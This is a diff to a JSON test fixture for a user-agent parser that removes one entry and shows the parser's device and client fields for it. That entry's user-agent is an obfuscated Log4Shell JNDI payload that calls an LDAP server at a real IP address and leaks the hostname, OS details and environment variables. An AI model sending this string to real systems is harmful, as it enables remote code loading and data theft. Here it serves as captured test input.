@@ -223,50 +223,5 @@
       "version": null,
       "manufacturer": "unknown"
     }
-  },
-  {
-    "headers": {
-      "user-agent": "${${:-j}${:-n}${:-d}${:-i}:${:-l}${:-d}${:-a}${:-p}://143.198.244.73/dn=gAAAAABjIZkFL1TiGguY0z5dZLvTmNEYl4Zsok_RKlFNEOixvT2PmrqZP6hfoI-p5nRvIoPwABw3MKmgEPYc4nU6goKCzm3wk4UZmGk9VlPH5OcsywuzxWP9DUChdcpSpYAF1IGG06vMsf9YuQpX50OGHGF764FnriOzccg9rPYDA7nDjjvkZP0Lo1gOI0MtokbzLW4r-HZ4xXzcgcc7pt2fPdXIasqOm0_WYzxmiGu3YOaIP_emel4otzRjJ-NwY1hDLvpn73bognqO-Ejth_sQicIjygfYNfvhfTdtP8oG3V0CbtfUpA2CInzs8PL9KUZAe1zcYJ3_VAMVUHNvwB-DILvvcAc7UVI07KTyCTynhDOJ3IUyofVAN9ssmL-VTvKd8t3MYj2eDawm16p1G1yh8JzpbBKRIfdCBbSLrzVxqIC2evSHzcomObdY2j8RHYM4hze_N43vNi77IWzQ4SzLYweABkBrtx1BgRiXubzYxX5cAkrBCnfA2mjg8LOM6ysHwvRV-Akw3aH4t2m-7TX-wBjybNv4T3LXPN3oOpKUEgzP1YzOYz3BQUflRWxCf87Hk4fzh-uGMeo0kNhAct8DJBywxvcch5jL4H4RdnB0ZavfA7YcuATLHqk_yPv0r9i3uen5F5C15dt4_AaXPzaUdL64097_t_ipoVp2qus_mogyY3nTr6pHhU9uSZsx4rQp75jrZlTgcVpomKATzXXVT1KrKN6IIx4NLYv0akN0YT5ibKqcCFsLq-JB7ckjmtEDkkHXhfgw2l0fJmGYNx4ih1lOPlyqnL5glOafgoZAVY2o7caZlGn8DdrpE0diyPjMvcN_DofziIFu3iFNaqzXi_ZQr-EmB1oer13Z-O9btulZ6n_0cxp1nHTpbRQA4Ez0ekly5jEu1YZjc6xC31U3QYnwWFu7cGbjtUM3F-Js5F7xCKwJo1SlPKGpBYQOdsBtXb9oYquZUtjAYrPRpmaSnMdKwGs5zPcsLlA1q-sm1QqycUb8UpMQ2EnUYWAEDrxQ5aWBSSkERjHvA7k_ma3c1sugizukhw==,cn='${hostName}',ou='${java:os}',ca1='${ENV:HOME:-Non}',ca2='${log4j:configParentLocation}',wca2='${ENV:HOMEPATH:-Non}'}"
-    },
-    "device": {
-      "architecture": null,
-      "deviceName": "general Desktop",
-      "marketingName": "general Desktop",
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "dualOrientation": false,
-      "simCount": 0,
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "desktop",
-      "ismobile": false,
-      "istv": false,
-      "bits": null
-    },
-    "os": {
-      "name": "JavaOS",
-      "marketingName": "JavaOS",
-      "version": null,
-      "manufacturer": "Sun",
-      "bits": null
-    },
-    "client": {
-      "name": "Java Standard Library",
-      "modus": null,
-      "version": null,
-      "manufacturer": "Oracle",
-      "type": "library",
-      "isbot": false,
-      "bits": null
-    },
-    "engine": {
-      "name": "Text",
-      "version": null,
-      "manufacturer": "unknown"
-    }
   }
 ]
